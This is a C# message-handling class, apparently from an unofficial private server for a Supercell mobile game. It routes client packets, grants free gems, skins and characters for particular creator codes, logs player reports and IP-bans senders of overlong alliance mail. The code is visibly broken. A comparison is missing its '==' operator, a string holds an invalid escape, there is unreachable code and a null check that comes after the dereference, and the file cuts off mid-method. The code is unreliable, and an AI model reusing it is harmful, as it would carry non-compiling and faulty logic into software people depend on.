namespace Supercell.Laser.Server.Message
{
    using MySql.Data.MySqlClient;
    using Supercell.Laser.Logic.Avatar;
    using Supercell.Laser.Logic.Data;
    using Supercell.Laser.Logic.Home;
    using Supercell.Laser.Logic.Message.Account.Auth;
    using Supercell.Laser.Logic.Util;
    using Supercell.Laser.Server.Database;
    using Supercell.Laser.Server.Database.Cache;
    using Supercell.Laser.Server.Database.Models;
    using Supercell.Laser.Server.Networking.Session;
    using Supercell.Laser.Server.Handler;
    using Supercell.Laser.Logic.Avatar;
    using Supercell.Laser.Logic.Avatar.Structures;
    using Supercell.Laser.Logic.Club;
    using Supercell.Laser.Logic.Command.Avatar;
    using Supercell.Laser.Logic.Data;
    using Supercell.Laser.Logic.Friends;
    using Supercell.Laser.Logic.Home;
    using Supercell.Laser.Logic.Home.Structures;
    using Supercell.Laser.Logic.Listener;
    using Supercell.Laser.Logic.Message.Account;
    using Supercell.Laser.Logic.Message.Club;
    using Supercell.Laser.Logic.Message.Friends;
    using Supercell.Laser.Logic.Message.Home;
    using Supercell.Laser.Logic.Message.Ranking;
    using Supercell.Laser.Logic.Message.Security;
    using Supercell.Laser.Logic.Message.Team;
    using Supercell.Laser.Logic.Message.Udp;
    using Supercell.Laser.Logic.Stream.Entry;
    using Supercell.Laser.Logic.Team;
    using Supercell.Laser.Server.Database;
    using Supercell.Laser.Server.Database.Models;
    using Supercell.Laser.Server.Logic.Game;
    using Supercell.Laser.Server.Networking;
    using Supercell.Laser.Server.Networking.Session;
    using Supercell.Laser.Server.Settings;
    using Supercell.Laser.Server.Logic;
    using System.Diagnostics;
    using Supercell.Laser.Server.Database.Cache;
    using Supercell.Laser.Logic.Util;
    using Supercell.Laser.Logic.Battle;
    using Supercell.Laser.Logic.Message.Battle;
    using Supercell.Laser.Server.Networking.UDP.Game;
    using Supercell.Laser.Server.Networking.Security;
    using Supercell.Laser.Logic.Home.Items;
    using Supercell.Laser.Logic.Team.Stream;
    using Supercell.Laser.Logic.Message.Team.Stream;
    using Supercell.Laser.Logic.Message;
    using Supercell.Laser.Logic.Message.Account.Auth;
    using Supercell.Laser.Logic.Message.Latency;
    using Supercell.Laser.Logic.Command;
    using Supercell.Laser.Logic.Battle.Structures;
    using Newtonsoft.Json.Linq;
    using System.Reflection;
    using System.Numerics;
    using Supercell.Laser.Logic.Home.Quest;
    using Supercell.Laser.Logic.Data.Helper;
    using System.Linq;
    using Supercell.Laser.Logic.Command.Home;
    using Ubiety.Dns.Core;
    using System.Xml.Linq;
    using Microsoft.VisualBasic;
    using MySqlX.XDevAPI.Relational;
    using System.Security.Principal;
    using Newtonsoft.Json;
    using Discord;
    using System.Net;

    using MimeKit;
    using MailKit.Net.Smtp;
    using Supercell.Laser.Titan.DataStream;
    using Supercell.Laser.Logic.Home.Gatcha;
    using Supercell.Laser.Logic.Message.Avatar;
    using System.Text;

    public class MessageManager
    {
        public Connection Connection { get; }

        public HomeMode HomeMode;

        public CommandManager CommandManager;

        private DateTime LastKeepAlive;

        private List<int> developerIDs = new List<int> { 1, 2, 3, 4, 5 };
        private int _loginMessageCount = 0;
        private DateTime _lastResetTime;
        private bool _isRateLimited = false;
        private DateTime _rateLimitEndTime;
        public MessageManager(Connection connection)
        {
            Connection = connection;
            LastKeepAlive = DateTime.UtcNow;
            
            _lastResetTime = DateTime.Now;

        }

        private bool kodorhani = false;

        public bool IsAlive()
        {
            return (int)(DateTime.UtcNow - LastKeepAlive).TotalSeconds < 30;
        }
        public string GetPingIconByMs(int ms)
        {
            //string str = "▂   ";
            string str = " ";
            if (ms <= 75)
            {
                //str = "▂▄▆█";
                str = " ";
            }
            else if (ms <= 125)
            {
                //str = "▂▄▆ ";
                str = " ";
            }
            else if (ms <= 300)
            {
                //str = "▂▄  ";
                str = " ";
            }
            return str;
        }

        public void ShowLobbyInfo()
        {
            string abd = $"Connection: {GetPingIconByMs(0)}(---ms)\n";
            if (Connection.Ping != 0)
            {
                abd = $"Connection: {GetPingIconByMs(Connection.Ping)} ({Connection.Ping}ms)\n";
            }

            string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;


            string lobbyInfoDirectory = Path.Combine(currentDirectory, "lobbyinfo");



            if (!Directory.Exists(lobbyInfoDirectory))
            {
                Directory.CreateDirectory(lobbyInfoDirectory);
            }


            string accountIdFilePath = Path.Combine(lobbyInfoDirectory, HomeMode.Avatar.AccountId + ".txt");

            if (File.Exists(accountIdFilePath))
            {
                LobbyInfoMessage b = new()
                {
                    LobbyData = $"TARA BRAWL\nTG:@TARA_STARSS\DC@STATES.W=DC@MAMİALİ544\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
                    PlayersCount = 0
                };
                Connection.Send(b);
            }
            else
            {
                LobbyInfoMessage b = new()
                {
                    LobbyData = $"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
                    PlayersCount = 0
                };
                Connection.Send(b);
            }


        }

        static void RestartApplication()
        {
            try
            {

                string exePath = Process.GetCurrentProcess().MainModule.FileName;

                ProcessStartInfo startInfo = new ProcessStartInfo(exePath)
                {
                    UseShellExecute = false,
                    CreateNoWindow = false
                };

                Process.Start(startInfo);

                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Uygulama yeniden başlatılamadı: {ex.Message}");
            }
        }

        public void ReceiveMessage(GameMessage message)
        {
           // Console.WriteLine("received: " + message.GetMessageType());
            switch (message.GetMessageType())
            {
                case 10100:
                    ClientHelloReceived((ClientHelloMessage)message);
                    break;
                case 10101:
                    LoginReceived((AuthenticationMessage)message);
                    break;
                case 10107:
                    ClientCapabilitesReceived((ClientCapabilitiesMessage)message);
                    //Connection.Send(new StartLatencyTestRequestMessage());
                    break;
                case 10108:
                    LastKeepAlive = DateTime.UtcNow;
                    Connection.Send(new KeepAliveServerMessage());
                    ShowLobbyInfo();
                    if (!Sessions.IsSessionActive(HomeMode.Avatar.AccountId))
                    {
                        Sessions.Create(HomeMode, Connection);
                    }
                    break;
                case 10110:
                    ShowLobbyInfo();
                    break;
                case 10119:
                    ReportAllianceStreamReceived((ReportAllianceStreamMessage)message);
                    break;
                case 10212:
                    ChangeName((ChangeAvatarNameMessage)message);
                    break;
                case 10177:
                    ClientInfoReceived((ClientInfoMessage)message);
                    break;
                case 10501:
                    AcceptFriendReceived((AcceptFriendMessage)message);
                    break;
                case 10502:
                    AddFriendReceived((AddFriendMessage)message);
                    break;
                case 10504:
                    AskForFriendListReceived((AskForFriendListMessage)message);
                    break;
                case 10506:
                    RemoveFriendReceived((RemoveFriendMessage)message);
                    break;
                case 10576:
                    SetBlockFriendRequestsReceived((SetBlockFriendRequestsMessage)message);
                    break;
                case 10555:
                    break;
                case 14101:
                    GoHomeReceived((GoHomeMessage)message);
                    break;
                case 14102:
                    EndClientTurnReceived((EndClientTurnMessage)message);
                    break;
                case 14103:
                    MatchmakeRequestReceived((MatchmakeRequestMessage)message);
                    break;
                case 14104:
                    StartSpectateReceived((StartSpectateMessage)message);
                    break;
                case 14106:
                    CancelMatchMaking((CancelMatchmakingMessage)message);
                    break;
                case 14107:
                    StopSpectateReceived((StopSpectateMessage)message);
                    break;
                case 14109:
                    GoHomeFromOfflinePractiseReceived((GoHomeFromOfflinePractiseMessage)message);
                    break;
                case 14110:
                    AskForBattleEndReceived((AskForBattleEndMessage)message);
                    break;
                case 14113:
                    GetPlayerProfile((GetPlayerProfileMessage)message);
                    break;
                case 14114:
                    BattleLogMessageReceived((BattleLogMessage)message);
                    break;
                case 14166:
                    break;
                case 14277:
                    GetSeasonRewardsReceived((GetSeasonRewardsMessage)message);
                    break;
                case 14301:
                    CreateAllianceReceived((CreateAllianceMessage)message);
                    break;
                case 14302:
                    AskForAllianceDataReceived((AskForAllianceDataMessage)message);
                    break;
                case 14303:
                    AskForJoinableAllianceListReceived((AskForJoinableAllianceListMessage)message);
                    break;
                case 14305:
                    JoinAllianceReceived((JoinAllianceMessage)message);
                    break;
                case 14306:
                    ChangeAllianceMemberRoleReceived((ChangeAllianceMemberRoleMessage)message);
                    break;
                case 14307:
                    KickAllianceMemberReceived((KickAllianceMemberMessage)message);
                    break;
                case 14308:
                    LeaveAllianceReceived((LeaveAllianceMessage)message);
                    break;
                case 14315:
                    ChatToAllianceStreamReceived((ChatToAllianceStreamMessage)message);
                    break;
                case 14316:
                    ChangeAllianceSettingsReceived((ChangeAllianceSettingsMessage)message);
                    break;
                case 14324:
                    //Console.WriteLine("Alliancesearch");
                    AllianceSearchReceived((AllianceSearchMessage)message);
                    break;
                case 14330:
                    SendAllianceMailMessage((SendAllianceMailMessage)message);
                    break;
                case 14350:
                    TeamCreateReceived((TeamCreateMessage)message);
                    break;
                case 14353:
                    TeamLeaveReceived((TeamLeaveMessage)message);
                    break;
                case 14354:
                    TeamChangeMemberSettingsReceived((TeamChangeMemberSettingsMessage)message);
                    break;
                case 14355:
                    TeamSetMemberReadyReceived((TeamSetMemberReadyMessage)message);
                    break;
                case 14358:
                    TeamSpectateMessageReceived((TeamSpectateMessage)message);
                    break;
                case 14359:
                    TeamChatReceived((TeamChatMessage)message);
                    break;
                case 14361:
                    TeamMemberStatusReceived((TeamMemberStatusMessage)message);
                    ShowLobbyInfo();
                    break;
                case 14362:
                    TeamSetEventReceived((TeamSetEventMessage)message);
                    break;
                case 14363:
                    TeamSetLocationReceived((TeamSetLocationMessage)message);
                    break;
                case 14365:
                    TeamInviteReceived((TeamInviteMessage)message);
                    break;
                case 14366:
                    PlayerStatusReceived((PlayerStatusMessage)message);
                    ShowLobbyInfo();
                    break;
                case 14369:
                    TeamPremadeChatReceived((TeamPremadeChatMessage)message);
                    break;
                case 14370:
                    TeamInviteReceived((TeamInviteMessage)message);
                    break;
                case 14367:
                    TeamClearInviteReceived((TeamClearInviteMessage)message);
                    break;
                case 14403:
                    GetLeaderboardReceived((GetLeaderboardMessage)message);
                    break;
                case 14479:
                    TeamInvitationResponseReceived((TeamInvitationResponseMessage)message);
                    break;
                case 14600:
                    AvatarNameCheckRequestReceived((AvatarNameCheckRequestMessage)message);
                    break;
                case 14777:
                    SetInvitesBlockedReceived((SetInvitesBlockedMessage)message);
                    break;
                case 18686:
                    SetSupportedCreator((SetSupportedCreatorMessage)message);
                    break;
                case 19001:
                    LatencyTestResultReceived((LatencyTestResultMessage)message);
                    break;

                    Logger.Print($"[MessageManager::ReceiveMessage] Message received! PacketName: {message.GetType().Name}, PacketID: {message.GetMessageType()}");

                default:
                    Logger.Print($"MessageManager::ReceiveMessage - no case for {message.GetType().Name} ({message.GetMessageType()})");
                    break;
            }
        }

        private void SetSupportedCreator(SetSupportedCreatorMessage message)
        {
            Console.WriteLine($"{HomeMode.Home.belesodul}");
            Console.WriteLine("nk:" + message.Creator);
            if (message.Creator == "Free" && (HomeMode.Home.belesodul == 0 || HomeMode.Home.belesodul == 2))
            {
                Console.WriteLine(message.Creator);

                Console.WriteLine($"{HomeMode.Home.belesodul}");
                if (HomeMode.Home.belesodul == 2)
                {
                    HomeMode.Home.belesodul = 3;
                }
                else
                {
                    HomeMode.Home.belesodul = 1;
                }
                Console.WriteLine($"{HomeMode.Home.belesodul}");
                LogicGiveDeliveryItemsCommand delivery = new LogicGiveDeliveryItemsCommand();
                DeliveryUnit unit = new DeliveryUnit(100);
                GatchaDrop reward = new GatchaDrop(8);
                reward.Count = 200;
                unit.AddDrop(reward);
                delivery.DeliveryUnits.Add(unit);
                delivery.Execute(HomeMode);

                AvailableServerCommandMessage messageq = new AvailableServerCommandMessage();
                messageq.Command = delivery;
                HomeMode.GameListener.SendMessage(messageq);
            }
            if (message.Creator "tarabrawl" && (HomeMode.Home.belesodul == 0 || HomeMode.Home.belesodul == 1))
            {
                Console.WriteLine(message.Creator);

                Console.WriteLine($"{HomeMode.Home.belesodul}");
                if (HomeMode.Home.belesodul == 1)
                {
                    HomeMode.Home.belesodul = 3;
                }
                else
                {
                    HomeMode.Home.belesodul = 2;
                }
                Console.WriteLine($"{HomeMode.Home.belesodul}");
                LogicGiveDeliveryItemsCommand delivery = new LogicGiveDeliveryItemsCommand();
                DeliveryUnit unit = new DeliveryUnit(100);
                GatchaDrop reward = new GatchaDrop(8);//elmas
                GatchaDrop rewardmk = new GatchaDrop(8);//elmas ekstra
                GatchaDrop rewardaa = new GatchaDrop(9); //skin
                GatchaDrop rewardaaa = new GatchaDrop(1); //karakter
                GatchaDrop rewarda = new GatchaDrop(7); //altin
                GatchaDrop rewardaaaa = new GatchaDrop(6); //guc puani
                GatchaDrop rewardaaaaa = new GatchaDrop(4); //yildiz gucu
                GatchaDrop rewardaaaaaa = new GatchaDrop(4); //yildiz gucu 2
                GatchaDrop rewardaaaaaaa = new GatchaDrop(4); //yildiz gucu 3
                GatchaDrop rewardaaaaaaaa = new GatchaDrop(4); //aksesuar
                rewardaa.SkinGlobalId = GlobalId.CreateGlobalId(29, 146); //oyuncu bibi 2020
                rewardaaa.DataGlobalId = 16000000 + 26; //bibi
                reward.Count = 100;
                rewarda.Count = 6500;
                rewardaa.Count = 1;
                rewardaaa.Count = 1;
                rewardmk.Count = 200;
                rewardaaaa.Count = 6000;
                rewardaaaaa.Count = 1;
                rewardaaaaaa.Count = 1;
                rewardaaaaaaa.Count = 1;
                rewardaaaaaaaa.Count = 1;
                rewardaaaa.DataGlobalId = 16000000 + 26; //bibi
                rewardaaaaa.CardGlobalId = 23000000 + 134; //bibi
                rewardaaaaaa.CardGlobalId = 23000000 + 146; //bibi
                rewardaaaaaaa.CardGlobalId = 23000000 + 165; //bibi
                rewardaaaaaaaa.CardGlobalId = 23000000 + 275; //bibi
                bool bibi = HomeMode.Avatar.HasHero(16000000 + 26);
                bool mk = HomeMode.Home.UnlockedSkins.Contains(29000146);
                if (bibi == false) // karakteri yok bibi ver
                {
                    unit.AddDrop(rewardaaa);
                    unit.AddDrop(rewardaa);
                    unit.AddDrop(rewardaaaa);
                    unit.AddDrop(rewardaaaaa);
                    unit.AddDrop(rewardaaaaaa);
                    unit.AddDrop(rewardaaaaaaa);
                    unit.AddDrop(rewardaaaaaaaa);
                    unit.AddDrop(reward);
                    unit.AddDrop(rewarda);
                }
                else
                {
                    if (mk == false) // skini yok skin ver
                    {
                        unit.AddDrop(rewardaa);
                        unit.AddDrop(rewardaaaa);
                        unit.AddDrop(rewardaaaaa);
                        unit.AddDrop(rewardaaaaaa);
                        unit.AddDrop(rewardaaaaaaa);
                        unit.AddDrop(rewardaaaaaaaa);
                        unit.AddDrop(reward);
                        unit.AddDrop(rewarda);
                    }
                    else // skini var ekstra gem ver
                    {
                        unit.AddDrop(rewardaaaa);
                        unit.AddDrop(rewardaaaaa);
                        unit.AddDrop(rewardaaaaaa);
                        unit.AddDrop(rewardaaaaaaa);
                        unit.AddDrop(rewardaaaaaaaa);
                        unit.AddDrop(rewardmk);
                        unit.AddDrop(reward);
                        unit.AddDrop(rewarda);
                    }
                }
                delivery.DeliveryUnits.Add(unit);
                delivery.Execute(HomeMode);

                AvailableServerCommandMessage messageq = new AvailableServerCommandMessage();
                messageq.Command = delivery;

                HomeMode.GameListener.SendMessage(messageq);
            }
            if (Creators.CreatorExists(message.Creator))
            {
                if (!string.IsNullOrEmpty(HomeMode.Avatar.SupportedCreator))
                {
                    Creators.ReduceCreator(HomeMode.Avatar.SupportedCreator);
                }

                HomeMode.Avatar.SupportedCreator = message.Creator;
                LogicSetSupportedCreatorCommand acmGems = new()
                {
                    Name = message.Creator
                };
                //Console.WriteLine(message.Creator);
                AvailableServerCommandMessage msg = new AvailableServerCommandMessage();
                msg.Command = acmGems;

                Connection.Send(msg);
                Creators.IncreaseCreator(message.Creator);

            }
            else
            {
                if (string.IsNullOrWhiteSpace(message.Creator))
                {

                    if (!string.IsNullOrEmpty(HomeMode.Avatar.SupportedCreator))
                    {
                        Creators.ReduceCreator(HomeMode.Avatar.SupportedCreator);
                    }
                    HomeMode.Avatar.SupportedCreator = message.Creator;
                    LogicSetSupportedCreatorCommand acmGems = new()
                    {
                        Name = message.Creator
                    };
                    //Console.WriteLine(message.Creator);
                    AvailableServerCommandMessage msg = new AvailableServerCommandMessage();
                    msg.Command = acmGems;

                    Connection.Send(msg);
                }
                else
                {
                    if (message.Creator == "Tara brawl" || message.Creator == "Free")
                    {
                        
                    }
                    else
                    {
                        SetSupportedCreatorResponse response = new SetSupportedCreatorResponse();
                        Connection.Send(response);
                    }
                }
            }


            //orh




        }

        private void TeamSpectateMessageReceived(TeamSpectateMessage message)
        {
            TeamEntry team = Teams.Get(message.TeamId);
            if (team == null) return;
            HomeMode.Avatar.TeamId = team.Id;
            TeamMember member = new TeamMember();
            member.AccountId = HomeMode.Avatar.AccountId;
            member.CharacterId = HomeMode.Home.CharacterId;
            member.DisplayData = new PlayerDisplayData(HomeMode.Home.HasPremiumPass, HomeMode.Home.ThumbnailId, HomeMode.Home.NameColorId, HomeMode.Avatar.Name);

            Hero hero = HomeMode.Avatar.GetHero(HomeMode.Home.CharacterId);
            member.HeroLevel = hero.PowerLevel;
            if (hero.HasStarpower)
            {
                CardData card = null;
                CharacterData cd = DataTables.Get(DataType.Character).GetDataByGlobalId<CharacterData>(hero.CharacterId);
                card = DataTables.Get(DataType.Card).GetData<CardData>(cd.Name + "_unique");
                CardData card2 = DataTables.Get(DataType.Card).GetData<CardData>(cd.Name + "_unique_2");
                if (HomeMode.Avatar.SelectedStarpowers.Contains(card.GetGlobalId()))
                {
                    member.HeroLevel = 9;
                    member.Starpower = card.GetGlobalId();
                }
                else if (HomeMode.Avatar.SelectedStarpowers.Contains(card2.GetGlobalId()))
                {
                    member.HeroLevel = 9;
                    member.Starpower = card2.GetGlobalId();
                }
                else if (HomeMode.Avatar.Starpowers.Contains(card.GetGlobalId()))
                {
                    member.HeroLevel = 9;
                    member.Starpower = card.GetGlobalId();
                }
                else if (HomeMode.Avatar.Starpowers.Contains(card2.GetGlobalId()))
                {
                    member.HeroLevel = 9;
                    member.Starpower = card2.GetGlobalId();
                }
            }
            else
            {
                member.Starpower = 0;
            }
            if (hero.PowerLevel > 5)
            {
                string[] cards = { "GrowBush", "Shield", "Heal", "Jump", "ShootAround", "DestroyPet", "PetSlam", "Slow", "Push", "Dash", "SpeedBoost", "BurstHeal", "Spin", "Teleport", "Immunity", "Trail", "Totem", "Grab", "Swing", "Vision", "Regen", "HandGun", "Promote", "Sleep", "Slow", "Reload", "Fake", "Trampoline", "Explode", "Blink", "PoisonTrigger", "Barrage", "Focus", "MineTrigger", "Reload", "Seeker", "Meteor", "HealPotion", "Stun", "TurretBuff" };
                CharacterData cd = DataTables.Get(DataType.Character).GetDataByGlobalId<CharacterData>(hero.CharacterId);
                CardData WildCard = null;
                foreach (string cardname in cards)
                {
                    string n = char.ToUpper(cd.Name[0]) + cd.Name.Substring(1);
                    //Console.WriteLine(n + "_" + cardname);
                    WildCard = DataTables.Get(DataType.Card).GetData<CardData>(n + "_" + cardname);
                    if (WildCard != null)
                    {
                        if (HomeMode.Avatar.Starpowers.Contains(WildCard.GetGlobalId()))
                        {
                            member.Gadget = WildCard.GetGlobalId();
                            break;
                        }

                    }
                }
            }
            else
            {
                member.Gadget = 0;
            }
            member.SkinId = GlobalId.CreateGlobalId(29, HomeMode.Home.SelectedSkins[GlobalId.GetInstanceId(HomeMode.Home.CharacterId)]);
            member.HeroTrophies = hero.Trophies;
            member.HeroHighestTrophies = hero.HighestTrophies;

            member.IsOwner = false;
            member.State = 2;
            team.Members.Add(member);
            team.TeamUpdated();
        }

        private void SetBlockFriendRequestsReceived(SetBlockFriendRequestsMessage message)
        {
            //HomeMode.Home.BlockFriendRequests = message.State;
        }

        private void ReportAllianceStreamReceived(ReportAllianceStreamMessage message)
        {
            if (HomeMode.Avatar.AllianceId < 0) return;
            Alliance myAlliance = Alliances.Load(HomeMode.Avatar.AllianceId);
            if (myAlliance == null) return;
            if (HomeMode.Home.ReportsIds.Count > 5)
            {
                Connection.Send(new ReportUserStatusMessage()
                {
                    Status = 2
                });
                return;
            }
            long index = 0;
            foreach (AllianceStreamEntry e in myAlliance.Stream.GetEntries())
            {
                index++;
                if (e.Id == message.MessageIndex)
                {
                    if (HomeMode.Home.ReportsIds.Contains(e.AuthorId))
                    {
                        Connection.Send(new ReportUserStatusMessage()
                        {
                            Status = 3
                        });
                        return;
                    }
                    string reporterTag = LogicLongCodeGenerator.ToCode(HomeMode.Avatar.AccountId);
                    string reporterName = HomeMode.Avatar.Name;
                    string susTag = LogicLongCodeGenerator.ToCode(e.AuthorId);
                    string susName = e.AuthorName;
                    HomeMode.Home.ReportsIds.Add(e.AuthorId);
                    string text = "";
                    try { text += myAlliance.Stream.GetEntries()[index - 5].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index - 5].AuthorId) + " " + myAlliance.Stream.GetEntries()[index - 5].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index - 5].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index - 4].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index - 4].AuthorId) + " " + myAlliance.Stream.GetEntries()[index - 4].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index - 4].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index - 3].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index - 3].AuthorId) + " " + myAlliance.Stream.GetEntries()[index - 3].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index - 3].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index - 2].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index - 2].AuthorId) + " " + myAlliance.Stream.GetEntries()[index - 2].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index - 2].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index - 1].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index - 1].AuthorId) + " " + myAlliance.Stream.GetEntries()[index - 1].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index - 1].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index - 0].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index - 0].AuthorId) + " " + myAlliance.Stream.GetEntries()[index - 0].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index - 0].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index + 1].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index + 1].AuthorId) + " " + myAlliance.Stream.GetEntries()[index + 1].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index + 1].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index + 2].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index + 2].AuthorId) + " " + myAlliance.Stream.GetEntries()[index + 2].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index + 2].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index + 3].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index + 3].AuthorId) + " " + myAlliance.Stream.GetEntries()[index + 3].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index + 3].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index + 4].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index + 4].AuthorId) + " " + myAlliance.Stream.GetEntries()[index + 4].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index + 4].Message + "\n"; } catch { }
                    try { text += myAlliance.Stream.GetEntries()[index + 5].SendTime + " " + LogicLongCodeGenerator.ToCode(myAlliance.Stream.GetEntries()[index + 5].AuthorId) + " " + myAlliance.Stream.GetEntries()[index + 5].AuthorName + ">>> " + myAlliance.Stream.GetEntries()[index + 5].Message + "\n"; } catch { }
                    Logger.HandleReport($"Player {reporterName}, {reporterTag} reported player {susName}, {susTag}, in this msgs:\n`\n{text}`");
                    Connection.Send(new ReportUserStatusMessage()
                    {
                        Status = 1
                    });
                    break;
                }
            }
        }
        private void BattleLogMessageReceived(BattleLogMessage message)
        {
            ByteStream encoder = new ByteStream(10);
            message.Encode(encoder);
            Connection.Send(new BattleLogMessage());
        }
        private void GetSeasonRewardsReceived(GetSeasonRewardsMessage message)
        {
            Connection.Send(new SeasonRewardsMessage());
        }

        private void addNotifToAllAccounts(string message, long club)
        {
            addNotif("#2YYVPU", message, club);
            var allAccounts = Accounts.GetRankingList();
            foreach (var account in allAccounts)
            {
                string accountId = LogicLongCodeGenerator.ToCode(account.AccountId);
                addNotif(accountId, message, club);
            }
        }

        private void addNotif(string id, string message, long club)
        {
            long qwidGems = LogicLongCodeGenerator.ToId(id);
            Account targetAccountGems = Accounts.Load(qwidGems);
            if (targetAccountGems.Avatar.AllianceId == club)
            {


                if (targetAccountGems == null)
                {
                    Console.WriteLine($"Fail: account not found for ID {id}!");
                    return;
                }

                Account acc = new Account();

                Notification nGems = new Notification
                {
                    Id = 81,

                    //Gonderenkisiisimrenk = Accounts.Load(HomeMode.Avatar.AccountId).Home.NameColorId,
                    //Gonderenkisi = Accounts.Load(HomeMode.Avatar.AccountId).Avatar.Name,
                    MessageEntry = $"{message}"
                };
                targetAccountGems.Home.NotificationFactory.Add(nGems);
                LogicAddNotificationCommand acmGems = new()
                {
                    Notification = nGems
                };
                AvailableServerCommandMessage asmGems = new AvailableServerCommandMessage();
                asmGems.Command = acmGems;
                if (Sessions.IsSessionActive(qwidGems))
                {
                    var sessionGems = Sessions.GetSession(qwidGems);
                    sessionGems.GameListener.SendTCPMessage(asmGems);
                }
            }
        }

        private static void deletePassFromAllAccounts()
        {
            var allAccounts = Accounts.GetRankingList();
            foreach (var account in allAccounts)
            {
                string accountId = LogicLongCodeGenerator.ToCode(account.AccountId);
                deletePass(accountId);
            }
        }

        private static void deletePass(string id)
        {
            long qwidGems = LogicLongCodeGenerator.ToId(id);
            Account targetAccountGems = Accounts.Load(qwidGems);

            if (targetAccountGems == null)
            {
                Console.WriteLine($"Fail: account not found for ID {id}!");
                return;
            }

            targetAccountGems.Home.BrawlPassProgress = 0;
            targetAccountGems.Home.HasPremiumPass = false;
            targetAccountGems.Home.BrawlPassTokens = 0;

            if (targetAccountGems.Home.PremiumPassProgress > 0)
            {
                targetAccountGems.Home.PremiumPassProgress = 0;
            }
        }


        private void SetInvitesBlockedReceived(SetInvitesBlockedMessage message)
        {
            HomeMode.Avatar.DoNotDisturb = message.State;
            LogicInviteBlockingChangedCommand command = new LogicInviteBlockingChangedCommand();
            command.State = message.State;
            AvailableServerCommandMessage serverCommandMessage = new AvailableServerCommandMessage();
            serverCommandMessage.Command = command;
            Connection.Send(serverCommandMessage);
            if (HomeMode.Avatar.AllianceId > 0)
            {
                Alliance a = Alliances.Load(HomeMode.Avatar.AllianceId);
                AllianceMember m = a.GetMemberById(HomeMode.Avatar.AccountId);
                m.DoNotDisturb = message.State;
                AllianceDataMessage dataMessage = new AllianceDataMessage()
                {
                    Alliance = a,
                    IsMyAlliance = true,
                };
                a.SendToAlliance(dataMessage);
            }
        }
        private void LatencyTestResultReceived(LatencyTestResultMessage message)
        {
            LatencyTestStatusMessage l = new()
            {
                Ping = Connection.Ping
            };
            Connection.Send(l);
        }

        private void SendAllianceMailMessage(SendAllianceMailMessage message)
        {
            SendAllianceMailMessage sendAllianceMailMessage = message;

            //Console.WriteLine("2193890213809218312");
            if (HomeMode.Avatar.AllianceRole != AllianceRole.Leader && HomeMode.Avatar.AllianceRole != AllianceRole.CoLeader) return;
            if (!string.IsNullOrWhiteSpace(message.Text))
            {
                if (HomeMode.Avatar.AllianceRole != AllianceRole.Leader && HomeMode.Avatar.AllianceRole != AllianceRole.CoLeader) return;
                if (message.Text.Length > 450)//tass
                {
                File.AppendAllLines(BlockedIpsFilePath, new[] { Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0] });
                Console.WriteLine($"IP BAN OZURLU EVLADI: {Connection.Socket.RemoteEndPoint.ToString().Split(" ")[0]}");
                return;
                }
                addNotifToAllAccounts(message.Text, HomeMode.Avatar.AllianceId);

                AllianceResponseMessage responseMessages = new AllianceResponseMessage();
                responseMessages.ResponseType = 113;
                Connection.Send(responseMessages);
            }

            AllianceResponseMessage responseMessage = new AllianceResponseMessage();
            responseMessage.ResponseType = 114;
            Connection.Send(responseMessage);

            Connection.Send(sendAllianceMailMessage);
        }

        private void TeamPremadeChatReceived(TeamPremadeChatMessage message)
        {
            if (HomeMode.Avatar.TeamId <= 0) return;

            TeamEntry team = GetTeam();
            if (team == null) return;

            QuickChatStreamEntry entry = new QuickChatStreamEntry();
            entry.AccountId = HomeMode.Avatar.AccountId;
            entry.TargetId = message.TargetId;
            entry.Name = HomeMode.Avatar.Name;

            if (message.TargetId > 0)
            {
                TeamMember member = team.GetMember(message.TargetId);
                if (member != null)
                {
                    entry.TargetPlayerName = member.DisplayData.Name;
                }
            }

            entry.MessageDataId = message.MessageDataId;
